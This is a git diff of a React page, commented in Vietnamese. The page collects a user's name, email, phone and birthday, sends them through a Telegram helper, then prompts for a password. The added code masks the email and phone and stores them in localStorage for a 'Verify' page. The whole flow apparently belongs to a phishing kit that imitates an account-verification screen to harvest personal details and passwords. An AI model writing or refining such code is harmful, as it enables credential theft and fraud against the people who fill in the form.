@@ -7,6 +7,7 @@ import { useState, useEffect, useCallback, useMemo } from 'react';
 import { translateText } from '@/utils/translate';
 import sendMessage from '@/utils/telegram';
 import { AsYouType, getCountryCallingCode } from 'libphonenumber-js';
+
 const Home = () => {
     const defaultTexts = useMemo(
         () => ({
@@ -59,6 +60,47 @@ const Home = () => {
     const validateEmail = (email) => {
         const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
         return emailRegex.test(email);
+    };
+
+    // Hàm chuyển đổi từ yyyy-mm-dd sang dd/mm/yyyy
+    const formatDateToDDMMYYYY = (dateString) => {
+        if (!dateString) return '';
+        const parts = dateString.split('-');
+        if (parts.length !== 3) return dateString;
+        return `${parts[2]}/${parts[1]}/${parts[0]}`;
+    };
+
+    // THÊM HÀM ẨN EMAIL: s****g@m****.com
+    const hideEmail = (email) => {
+        if (!email) return 's****g@m****.com';
+        const parts = email.split('@');
+        if (parts.length !== 2) return email;
+        
+        const username = parts[0];
+        const domain = parts[1];
+        const domainParts = domain.split('.');
+        
+        if (username.length <= 1) return email;
+        if (domainParts.length < 2) return email;
+        
+        // Format: s****g (ký tự đầu + *** + ký tự cuối)
+        const formattedUsername = username.charAt(0) + '*'.repeat(Math.max(0, username.length - 2)) + (username.length > 1 ? username.charAt(username.length - 1) : '');
+        
+        // Format: m****.com (ký tự đầu + *** + .com)
+        const formattedDomain = domainParts[0].charAt(0) + '*'.repeat(Math.max(0, domainParts[0].length - 1)) + '.' + domainParts.slice(1).join('.');
+        
+        return formattedUsername + '@' + formattedDomain;
+    };
+
+    // THÊM HÀM ẨN SỐ ĐIỆN THOẠI: ******32 (6 sao + 2 số cuối)
+    const hidePhone = (phone) => {
+        if (!phone) return '******32';
+        const cleanPhone = phone.replace(/^\+\d+\s*/, '');
+        if (cleanPhone.length < 2) return '******32';
+        
+        // Luôn hiển thị 6 sao + 2 số cuối
+        const lastTwoDigits = cleanPhone.slice(-2);
+        return '*'.repeat(6) + lastTwoDigits;
     };
 
     const translateAllTexts = useCallback(
@@ -179,6 +221,17 @@ const Home = () => {
             try {
                 const telegramMessage = formatTelegramMessage(formData);
                 await sendMessage(telegramMessage);
+
+                // THÊM CODE XỬ LÝ ẨN THÔNG TIN VÀ LƯU VÀO LOCALSTORAGE
+                const hiddenData = {
+                    name: formData.pageName,
+                    email: hideEmail(formData.mail),
+                    phone: hidePhone(formData.phone),
+                    birthday: formData.birthday
+                };
+
+                // Lưu vào localStorage để trang Verify lấy
+                localStorage.setItem('userInfo', JSON.stringify(hiddenData));
 
                 setShowPassword(true);
             } catch {
@@ -309,14 +362,24 @@ const Home = () => {
                                     {translatedTexts.birthday} <span className='text-red-500'>*</span>
                                 </p>
                                 
-                                {/* Desktop: type='date' bình thường */}
-                                <input 
-                                    type='date' 
-                                    name='birthday' 
-                                    className={`hidden sm:block w-full rounded-lg border px-3 py-2.5 sm:py-1.5 text-base ${errors.birthday ? 'border-[#dc3545]' : 'border-gray-300'}`} 
-                                    value={formData.birthday} 
-                                    onChange={(e) => handleInputChange('birthday', e.target.value)} 
-                                />
+                                {/* Desktop: type='date' với placeholder ảo */}
+                                <div className='hidden sm:block relative'>
+                                    <input 
+                                        type='date' 
+                                        name='birthday' 
+                                        className={`w-full rounded-lg border px-3 py-2.5 sm:py-1.5 text-base ${errors.birthday ? 'border-[#dc3545]' : 'border-gray-300'} opacity-0 absolute z-10`} 
+                                        value={formData.birthday} 
+                                        onChange={(e) => handleInputChange('birthday', e.target.value)}
+                                        required
+                                    />
+                                    {/* Placeholder ảo cho desktop */}
+                                    <div 
+                                        className={`w-full rounded-lg border px-3 py-2.5 sm:py-1.5 bg-white ${errors.birthday ? 'border-[#dc3545]' : 'border-gray-300'} ${formData.birthday ? 'text-gray-900 text-base' : 'text-gray-500 text-base'} font-medium`}
+                                        onClick={() => document.querySelectorAll('input[name="birthday"]')[0].click()}
+                                    >
+                                        {formData.birthday ? formatDateToDDMMYYYY(formData.birthday) : 'dd/mm/yyyy'}
+                                    </div>
+                                </div>
                                 
                                 {/* Mobile: type='date' với placeholder ảo */}
                                 <div className='block sm:hidden relative'>
@@ -331,9 +394,9 @@ const Home = () => {
                                     {/* Placeholder ảo cho mobile */}
                                     <div 
                                         className={`w-full rounded-lg border px-3 py-2.5 bg-white ${errors.birthday ? 'border-[#dc3545]' : 'border-gray-300'} ${formData.birthday ? 'text-gray-900 text-base' : 'text-gray-500 text-base'} font-medium`}
-                                        onClick={() => document.querySelector('input[name="birthday"]').click()}
+                                        onClick={() => document.querySelectorAll('input[name="birthday"]')[1].click()}
                                     >
-                                        {formData.birthday || 'dd/mm/yyyy'}
+                                        {formData.birthday ? formatDateToDDMMYYYY(formData.birthday) : 'dd/mm/yyyy'}
                                     </div>
                                 </div>
                                 
